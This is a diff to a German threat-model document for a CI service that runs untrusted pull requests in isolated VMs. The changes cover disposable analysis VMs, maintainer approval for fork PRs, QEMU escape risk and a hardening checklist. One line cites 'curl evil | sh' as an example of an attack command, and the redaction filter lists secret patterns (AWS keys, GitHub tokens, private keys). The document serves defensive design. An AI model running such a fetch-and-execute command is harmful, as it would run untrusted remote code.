@@ -1,5 +1,10 @@
 # 03 Sicherheitsmodell
 
+> Die verbindliche technische Umsetzung der Isolation und der Löschung steht in
+> [12 Isolation ohne Eskalationspfad und vollständige Löschung](12-isolation-und-loeschung.md).
+> Die Vertrauensrichtlinien stehen in [11 Admin-Oberfläche](11-admin-und-vertrauensrichtlinien.md).
+> Grundsatz: Jeder PR wird als feindlich behandelt, auch der des Repo-Besitzers.
+
 ## Bedrohungsmodell
 
 Angreifer ist jeder, der einen PR öffnen oder einen PR-Kommentar schreiben kann. Bei einem
@@ -57,8 +62,8 @@ Regeln zwischen den Zonen:
   Paket-Proxy (apt/npm/pip/cargo-Cache mit Allow-List der Upstream-Hosts) und, pro Repo
   konfigurierbar und im Bericht sichtbar, einzelne Hosts. Jeder verweigerte Versuch landet
   im Bericht als Finding der Kategorie `network`.
-- Der Controller selbst führt Stufe 0 in einem separaten, unprivilegierten Container
-  ohne Secrets aus. SAST- und Secret-Scanner laufen also auch nicht mit Token.
+- Stufe 0 läuft in einer eigenen Wegwerf-Analyse-VM ohne Secrets und ohne Netz. SAST- und
+  Secret-Scanner parsen feindliche Dateien und laufen deshalb nie auf dem Controller.
 - Bevor Logs in den Bericht kommen, läuft ein Redaktionsfilter (gitleaks-Regeln plus
   eigene Muster: `AKIA…`, `ghp_…`, `-----BEGIN … PRIVATE KEY-----`, JWTs, URLs mit
   Basic-Auth).
@@ -97,14 +102,19 @@ Log-Zeilen. Gegenmaßnahmen:
   Datei. Der PR kann also weder das Build-Kommando auf `curl evil | sh` umbiegen (er kann
   es zwar in seinen eigenen Skripten tun, aber in der VM ohne Egress) noch die Prüfung
   verkürzen.
-- Fork-PRs und PRs von Erstbeitragenden laufen standardmäßig nur bis Stufe 0. Stufe 1
-  braucht das Label `crosscheck:run`, das nur Maintainer setzen können. Das entspricht
-  dem Muster von GitHub Actions bei Erstbeitragenden.
+- Wann Stufe 1 für Fork-PRs und Erstbeiträge automatisch startet, legt der Admin fest
+  (`alle`, `approved`, `klassen`, `manuell`). Standard ist `approved`: Start erst nach einem
+  Maintainer-Approve auf genau diesem Head-SHA. Die Richtlinie steuert nur Kosten und
+  Umfang. Die Isolation ist für alle gleich.
 
 ### A4 Aus der Sandbox ausbrechen
 
 - Runner sind vollständige VMs (KVM), keine Container. Ein Ausbruch braucht einen
   Hypervisor-Exploit, nicht nur einen Kernel-Bug.
+- Proxmox startet QEMU als root ohne AppArmor-Profil. Ein QEMU-Ausbruch wäre root auf dem
+  Host. Deshalb läuft der Controller empfohlen auf einem eigenen Gerät, QEMU bekommt einen
+  seccomp-Filter, und GPU-Beschleunigung, verschachtelte Virtualisierung und Passthrough
+  sind an Vertrauensklassen gebunden (Details in [12](12-isolation-und-loeschung.md)).
 - VMs laufen in einem eigenen VLAN/Bridge (`vmbr-crosscheck`) ohne Route zum
   Management-Netz, zum Controller und zu anderen Runnern. Nur Framebuffer (VNC auf dem
   Host, an localhost gebunden) und Guest-Agent-Socket führen heraus, beide vom Host initiiert.
@@ -168,3 +178,8 @@ Der Bericht wird von Chat-Sessions gelesen, die selbst Werkzeuge haben. Ein Find
 - [ ] Redaktionsfilter gegen Test-Secrets geprüft
 - [ ] Bösartiger Test-PR (siehe [07 Roadmap](07-roadmap.md)) mindestens einmal gefahren
 - [ ] Budget für Stufe 2 gesetzt
+- [ ] Controller auf eigenem Gerät, oder gelbe Ampel bewusst akzeptiert
+- [ ] KSM aus, `mitigations` nicht `off`, seccomp im QEMU aktiv
+- [ ] IPv6 im Runner-Netz aus, Port-Isolation zwischen Runner-VMs aktiv
+- [ ] Aufräum-Dienst läuft, Löschprotokoll im letzten Bericht vollständig
+- [ ] Admin-Oberfläche nur über LAN oder Tailscale erreichbar, Anmeldung per Passkey
